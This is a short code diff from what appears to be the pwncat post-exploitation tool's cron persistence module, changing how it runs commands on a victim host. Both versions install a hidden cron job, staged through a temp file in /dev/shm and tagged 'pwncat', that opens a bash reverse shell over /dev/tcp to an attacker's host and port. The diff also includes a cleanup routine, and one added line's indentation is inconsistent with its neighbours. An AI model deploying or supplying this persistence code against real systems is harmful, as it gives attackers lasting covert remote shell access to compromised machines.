@@ -19,8 +19,8 @@ class Method(PersistenceMethod):
         # Listing all crons and creating a temp file so we can make sure that all currently installed crons stay that way
         # Bash oneliner using "pwncat" string to differentiate our cron from any existing ones
         # Installing original list of crons, with the reverse shell added to it 
-        print(str("Calling back to " + rhost + ":" + rport + " on a " + cron + " schedule."))
-        os.system("crontab -l 2> /dev/null > /dev/shm/.cron; echo \"" + cron + " echo pwncat && bash -c 'bash -i >& /dev/tcp/" + rhost + "/" + rport + " 0>&1'\" >> /dev/shm/.cron && crontab /dev/shm/.cron && rm /dev/shm/.cron")
+        pwncat.victim.run("crontab -l 2> /dev/null > /dev/shm/.cron; echo \"" + cron + " echo pwncat && bash -c 'bash -i >& /dev/tcp/" + rhost + "/" + rport + " 0>&1'\" >> /dev/shm/.cron && crontab /dev/shm/.cron && rm /dev/shm/.cron")
+    	print(str("Calling back to " + rhost + ":" + rport + " on a " + cron + " schedule."))
     def remove(self, user):
         # Using "pwncat" string to remove our crons and reinstalling the original ones
-        os.system("crontab -l | grep -v pwncat > /dev/shm/.cron; crontab /dev/shm/.cron && rm /dev/shm/.cron")
+        pwncat.victim.run("crontab -l | grep -v pwncat > /dev/shm/.cron; crontab /dev/shm/.cron && rm /dev/shm/.cron")
